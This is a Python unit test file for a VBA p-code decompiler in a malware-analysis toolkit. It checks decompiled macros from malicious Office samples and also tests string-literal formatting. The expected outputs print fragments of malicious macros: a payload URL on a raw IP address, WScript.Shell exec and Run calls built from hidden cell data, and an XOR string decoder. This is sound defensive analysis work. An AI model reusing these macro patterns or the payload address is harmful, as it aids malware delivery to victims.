import inspect
import re
import lzma
import functools

from refinery.lib.ole.decompiler import vba_string_literal

from ... import TestUnitBase

proc_new = re.compile(
    r'(?i)^\s*(((Public|Private|Friend)\s+)?(Static\s+)?(Sub|Function(?!\s+As\b)|Property\s+(Get|Let|Set)))\b')
proc_end = re.compile(
    r'(?i)^\s*End\s+(Sub|Function|Property)\b')


class TestVBAPC(TestUnitBase):

    def test_maldoc_01(self):
        data = self.download_sample('4bdc8e660ff4fb05e5b6c0a2dd70c537817f46ac3270d779fdddc8e459829c08')
        unit = self.load()
        code = list(data | unit)
        self.assertTrue(any(
            B'http://109.94.209'B'.91/12340.txt' in c for c in code))

    def test_maldoc_02(self):
        data = self.download_sample('ee103f8d64cd8fa884ff6a041db2f7aa403c502f54e26337c606044c2f205394')
        unit = self.load()
        code = list(data | unit)
        self.assertTrue(any(
            B'ActiveDocument.Content.Find.Execute FindText:="$1", ReplaceWith:=dowKarolYou, Replace:=wdReplaceAll' in c for c in code))

    def test_stomped_document_01(self):
        data = self.download_sample('6d8a0f5949adf37330348cc9a231958ad8fb3ea3a3d905abe5e72dbfd75a3d1d')
        unit = self.load()
        code = str(data | unit)
        goal = inspect.cleandoc(
            """
            Function justify_text_to_left(dt As String) As String
              On Error Resume Next
              Dim ks As String
              ks = page_border_width
              Dim dl As Long
              dl = ((Len(dt) / 2) - 1)
              kl = Len(ks)
              Dim s As String
              s = ""
              For i = 0 To dl
                Dim c1 As Integer
                Dim c2 As Integer
                c1 = Val("&H" & Mid(dt, ((i * 2) + 1), 2))
                c2 = Asc(Mid(ks, (i Mod kl) + 1, 1))
                s = s & Chr(c1 Xor c2)
              Next
              justify_text_to_left = s
            End Function
            """
        )
        self.assertIn(goal, code)

    @functools.lru_cache(maxsize=1)
    def _get_big_sample(self):
        compressed = self.download_sample('0baeac0475eb0e0ba51796cb9b303bae3bfc62c4dc10422146f37f72d7cbe823')
        return lzma.decompress(compressed)

    def _get_module(self, data: bytes, module_path: str) -> str:
        unit = self.load()
        for chunk in data | unit:
            if F'{chunk.meta["path"]}' == module_path:
                return bytes(chunk).decode('utf-8')
        self.fail(F'module not found: {module_path}')

    def test_indentation_inside_procedure_body(self):
        data = self.download_sample('63263c3b7aa5112510b3dbe9fd8a9d2cdd447d80067ba7ac49d6b183c259442d')
        goal = inspect.cleandoc(
            """
            Sub print_page()
              MsgBox "", Title:="VIEW": ActiveWorkbook.Close False
            End Sub

            Sub selectr()
              F = 2
              For Each A In [A1:IV5000].SpecialCells(xlConstants)
                If Len(A) > F Then dated = dated & Mid(A.Text, F, 1)
                Next: On Error Resume Next
              Debug.Print Replace((CurDir(F)(CreateObject("Wscript.shell").exec@(dated).For())), 987345#, F)
            End Sub

            Private Sub subA_Layout(ByVal Index As Long)
              t = "": selectr: bb = 9
            End Sub
            """
        )
        test = '\n'.join(data | self.load() | [str]).strip()
        self.assertEqual(test, goal)

    def test_next_keyword_indentation(self):
        data = self.download_sample('8168819cb693a3a04f771ee119ca00e631a74f09419ad295c5088f1e7a430e98')
        goal = inspect.cleandoc(
            '''
            Function for1()
              bh = 2
              for1 = ""
              for1 = for1 + Cells(48 + bh, bh)
              Next i
            End Function

            Sub subb()
              On Error Resume Next
              WScript.Quit CreateObject("WScript.Shell").Run(subs(50, 2, 11988), 0, False)
              On Error GoTo 0
            End Sub

            Function subs(g, yg, charss As Integer)
              Dim W(): Dim E As Integer
              formss = Cells(g, yg)
              For city = 1 To Len(formss)
                ReDim Preserve W(city)
                W(city) = Mid(formss, city, 1)
              Next
              Booleans = ""
              For E = 0 To charss Step 4
                Booleans = Booleans + W(E)
              Next E
              subs = Booleans
            End Function

            Private Sub page1_Layout(ByVal Index As Long)
              ThisWorkbook.subb
            End Sub

            Private Sub your_Click()
              page1_Layout
            End Sub
            '''
        )
        test = '\n'.join(data | self.load() | [str]).strip()
        self.assertEqual(test, goal)

    def test_no_orphan_end_from_ifdef(self):
        data = self._get_big_sample()
        code = self._get_module(data, 'Macros/VBA/APIRegistryUtil')
        depth = 0
        for lno, line in enumerate(code.splitlines(), 1):
            if proc_new.match(line):
                depth += 1
            if proc_end.match(line):
                self.assertGreater(depth, 0, F'At line {lno}: depth regressed to negative')
                depth -= 1

    def test_no_runaway_indentation(self):
        data = self._get_big_sample()
        code = self._get_module(data, 'Macros/VBA/BBPT_modExcelLinkHandler')
        max_indent = 0
        for line in code.splitlines():
            if line.strip():
                indent = len(line) - len(line.lstrip(' '))
                if indent > max_indent:
                    max_indent = indent
        self.assertLessEqual(max_indent, 20,
            F'maximum indentation is {max_indent} spaces ({max_indent // 2} levels); '
            F'this suggests runaway indent escalation from #If/#Else blocks')

    def test_no_single_line_select_at_zero_indent(self):
        data = self.download_sample('0f822b8f6b34755495585f3c22689081edc3300c2700fc0b69a35061db768700')
        code = self._get_module(data, 'VBA/Module2')
        select_re = re.compile(r'(?i)^Select Case .+End Select')
        for lno, line in enumerate(code.splitlines(), 1):
            self.assertIsNone(select_re.match(line), F'At line {lno}: single-line Select without indentation')

    def _assert_procedure_bodies_indented(self, code: str):
        inside = False
        for lno, line in enumerate(code.splitlines(), 1):
            if not inside:
                if proc_new.match(line):
                    inside = True
            elif proc_end.match(line):
                inside = False
            elif (stripped := line.strip()) and not stripped.startswith('#'):
                self.assertTrue(line.startswith(' '),
                    F'At line {lno}: line should be indented but does not start with a space')

    def _assert_all_procedure_bodies_indented(self, data: bytes):
        for chunk in data | self.load():
            code = bytes(chunk).decode('utf-8')
            if not code.strip():
                continue
            path = str(chunk.meta["path"])
            with self.subTest(module=path):
                self._assert_procedure_bodies_indented(code)

    def test_no_zero_indent_in_big_sample(self):
        self._assert_all_procedure_bodies_indented(self._get_big_sample())

    def test_block_indentation_consistency(self):
        self._assert_all_procedure_bodies_indented(self.download_sample(
            '0f822b8f6b34755495585f3c22689081edc3300c2700fc0b69a35061db768700'))

    def test_next_multi_var_indentation(self):
        data = self.download_sample('2052b1c9455383827cc6d14da43249fd2172e6bdd82e1b782383391ac36baceb')
        code = self._get_module(data, '_VBA_PROJECT_CUR/VBA/ThisWorkbook')
        for lno, line in enumerate(code.splitlines(), 1):
            if not (m := proc_end.match(line)):
                continue
            indent = len(line) - len(line.lstrip(' '))
            self.assertEqual(indent, 0, F'At line {lno}: illegal {indent}-indent before {m[0]}')

    def test_no_trailing_whitespace_on_resume(self):
        data = self._get_big_sample()
        code = self._get_module(data, 'Macros/VBA/BBPTv2_modPasteFromExcel')
        for lno, line in enumerate(code.splitlines(), 1):
            stripped = line.rstrip()
            self.assertFalse(stripped != line and stripped.endswith('Resume'),
                F'At line {lno}: Bare "Resume" with trailing whitespace')


class TestVBAStringLiteral(TestUnitBase):
    def test_plain_string(self):
        self.assertEqual(vba_string_literal('hello'), '"hello"')

    def test_empty_string(self):
        self.assertEqual(vba_string_literal(''), '""')

    def test_embedded_quotes(self):
        self.assertEqual(vba_string_literal('say "hi"'), '"say ""hi"""')

    def test_single_lf(self):
        self.assertEqual(vba_string_literal('\n'), 'vbLf')

    def test_single_cr(self):
        self.assertEqual(vba_string_literal('\r'), 'vbCr')

    def test_crlf(self):
        self.assertEqual(vba_string_literal('\r\n'), 'vbCrLf')

    def test_tab(self):
        self.assertEqual(vba_string_literal('\t'), 'vbTab')

    def test_null_char(self):
        self.assertEqual(vba_string_literal('\0'), 'vbNullChar')

    def test_text_with_lf(self):
        self.assertEqual(vba_string_literal('hello\nworld'), '"hello" & vbLf & "world"')

    def test_text_with_crlf(self):
        self.assertEqual(vba_string_literal('hello\r\nworld'), '"hello" & vbCrLf & "world"')

    def test_trailing_control(self):
        self.assertEqual(vba_string_literal('hello\n'), '"hello" & vbLf')

    def test_leading_control(self):
        self.assertEqual(vba_string_literal('\nhello'), 'vbLf & "hello"')

    def test_adjacent_controls(self):
        self.assertEqual(vba_string_literal('\n\t'), 'vbLf & vbTab')

    def test_all_controls_no_text(self):
        self.assertEqual(vba_string_literal('\r\n\t\0'), 'vbCrLf & vbTab & vbNullChar')

    def test_multiple_segments(self):
        self.assertEqual(vba_string_literal('a\nb\tc'), '"a" & vbLf & "b" & vbTab & "c"')
